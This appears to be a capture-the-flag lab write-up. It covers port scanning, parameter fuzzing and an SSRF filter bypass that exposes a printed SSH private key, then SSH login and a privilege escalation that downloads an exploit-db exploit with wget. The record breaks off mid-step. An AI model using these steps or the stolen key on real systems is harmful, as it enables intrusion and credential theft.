@@ -1,0 +1,93 @@
+## nmap:
+kali@kali:~/Downloads$ nmap -Pn 10.10.164.45
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 03:21 IST
+Nmap scan report for 10.10.164.45
+Host is up (0.29s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+## Directories:
+contact              (Status: 200) [Size: 1703]
+/feedback             (Status: 405) [Size: 178]
+/gallery              (Status: 200) [Size: 1722]
+/upload               (Status: 405) [Size: 178]
+/dejaview             (Status: 200) [Size: 823]
+
+FINDS:
+<!--To devs: Make sure that people can also add images using links-->
+
+We go to /dejaview and capture the site request with the proxy.
+
+we will fuzz the parameters that give the same contest length : the length is 823
+ffuf  -X POST -u "http://10.10.245.120:8080/view_image" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -d "FUZZ=http://londonbridge.thm:8080/uploads/www.usnews.jpeg" -H "Content-Type: application/x-www-form-urlencoded" -fs 823
+
+We got:: www
+we can replace 
+image_url=http://10.10.245.120:8080/uploads/www.usnews.jpeg
+with:::
+www=http://10.10.245.120:8080/uploads/www.usnews.jpeg
+
+::::
+### Enumerating Internal Services
+
+Now that we have an SSRF vulnerability, we can use it to enumerate the internal services.
+
+However, when attempting this, we see that using 127.0.0.1 or localhost in our URL results in a 403 FORBIDDEN response. This indicates that there is likely a filter in place.
+
+Looking for other payloads to access localhost, we can find many options here. Using http://127.1/ not only allows us to bypass the filter, but we also discover an internal web application running on 127.0.0.1:80.
+
+Fuzzing this internal web application for directories, we discover the ::
+.ssh directory.
+
+
+Authorized keys:
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
+
+id_rsa:
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
+5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
+a1s5eus3ghTWjcfONROAkEg7O3XsNwgp93UUB8wbU+ADpZnFLPUDErFKoSp+dxG4
+rxwqpAp6maqsE4dIZHdAq+Yt6/2HOERKrFWiONQpd6ZA8a325oWXY8UaREvKTuXc
+jlL56t4iWQzsRQbBvB+ETg2ma01u/HmW3M9SyroPypcEOqvPnuPpqXHZu7BwALM5
+NHhXCNmt+0EOBYKvejsDA6NeZfJgw65NVK+2hQIDAQABAoIBACJyZUaoBLegvMjg
+2S32IZUcrr4qJrlCeOCUQDQp196tzlughf/rAwH9qpv9hXW+uYVhJZR/gxPPdm6W
+Dlta1mIeuBLuHy9PDMDOAO0E0G9RIJha7iP5cJAJ2RvD6Gx/H7NTfQz64tQa39W4
+hng0O9KbxoJleVWeONIiFZOaXiJthuro/d9GSivMBJyT8PR3JG6G+R4Qq1tAJqEU
+Hx5DY/U7qVYQ1TE3EfbDR5y0+972fW7J0oZxOuwK6IWP9TtHcPPVIGweaIgZFys3
+3ZFEzON5qRhNdV8lc127cUX5R5hFjn14GHJLpvbjkt8D9DggUKKNR8zPJfIGO5Tp
+gdzclmECgYEA+kaVi0hq1sYSdZL4wHxDQJfGooPn8Hae8zFrsYjrVD8nOQ9NEz4N
+XKqlGMhPc8P0PvuoKy1341ty966S8J+dKfdPzRURFzB84wy3A6CDnViRpCYwKFo0
+Aa5wwpWZalBBpEis0h3YKCKVKyhs4/uN6lMw5H3GaCMdqqm00l9DRm0CgYEA1Bqq
+e2pPYVCwyQb20/8aP305wu6Bdp+i3dUqkHndhPXmEL8EnXbEJuBymn7aKQ3Ln/zX
+8G/7Mze845g93KAPFLeeNk/AmzXKnWB8mgcrFzxAD/wAxH1J9otLvhmX7BRVE6X/
+0he6g1mdtNMXbt0B/aMOS+dCsMW1C/7oUfbxAXkCgYAlCvVvXBSUHVT2Gf6/XqUF
+lnFL9IIL0ULNc+8go8dQ/NftVhpuUqzfnlI5TMyVsdcgy1akrWIlQI/PoQMWokk8
+wOIK1Kdm60JQyLz9yHAyhb1osk5GarNv3EXMRyAh4CcXDbqmjsxDhHrXnHAhfkYO
+/Kkr6IHJQAlQDTY6POdUMQKBgQCPPkMMfkuFyVzbJtzjZ1Futz+fKjw8xKrVbfUF
+BYhZF0h83sRbI65tIv/C3xCu0SZHshaTxsy7VlU2z8ZXjbEhqLAstce6CqX/iv4b
+d+PeGU6afPJ3wLWGz6Qjil1Tjpe2YVFXrbbEpm0fhcA5mwCRLuGk2VXs1Fjk9Q4o
+7MDu4QKBgFIomwhD+jmr3Vc2HutYkl3zliSD239sH3k118sTHbedvKH5Q7nw0C+U
+a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
+fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
+-----END RSA PRIVATE KEY-----
+
+::::
+nano id_rsa
+chmod 600 id_rsa
+
+ssh -i id_rsa beth@<TARGET_IP>
+
+find / -name user.txt 2/>/dev/null 
+
+WE WILL USE THE LINPEAS METHOD:
+
+we have found a vulnerability:
+steps:
+
+On out
+wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47166.zip
+unzip 47166.zip
+cd 47166
